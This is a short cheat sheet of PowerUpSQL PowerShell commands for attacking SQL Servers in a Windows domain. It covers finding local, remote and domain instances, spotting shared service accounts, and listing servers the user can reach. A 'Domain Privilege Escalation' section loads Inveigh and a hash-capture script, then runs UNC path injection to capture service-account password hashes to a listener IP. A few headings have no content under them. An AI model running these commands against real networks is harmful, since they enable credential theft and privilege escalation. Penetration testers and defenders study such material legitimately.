# PowerUpSQL Cheatsheet

## Discover Local SQL Server Instances
Get-SQLInstanceLocal -Verbose

## Discover Remote SQL Server Instances
Get-SQLInstanceScanUDPThreaded -Verbose -ComputerName SQLServer1

Get-SQLInstanceFile -FilePath c:\temp\computers.txt | Get-SQLInstanceScanUDPThreaded -Verbose

## Discover Domain SQL Server Instances
Get-SQLInstanceDomain -Verbose 

## Discover Domain Shared Service Account for SQL Server
Get-SQLInstanceDomain -Verbose | Where-Object {$_.DomainAccount -notlike "*$"} | Group-Object DomainAccount | Select Count, Name | Sort-Object Name -Descending

## List SQL Servers using a Specific Domain Account
Get-SQLInstanceDomain -Verbose -DomainAccount SQLSvc

## Get a list of domain SQL servers that can be logged into
$Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 | Where-Object {$_.Status -like "Accessible"} 
$Targets

# Identify Shared SQL Server Service Accounts



# 

# Domain Privilege Escalation 
### UNC Path Injection Against Accessible Domain SQL Servers
Import-Module C:\PowerUpSQL-master\PowerUpSQL.psd1

Import-Module C:\PowerUpSQL-master\Scripts\Pending\Get-SQLServiceAccountPwHashes.ps1

Import-Module C:\PowerUpSQL-master\Scripts\3rdparty\Inveigh.ps1 

Get-SQLServiceAccountPwHashes -Verbose -TimeOut 2 -CaptureIp 10.1.1.1 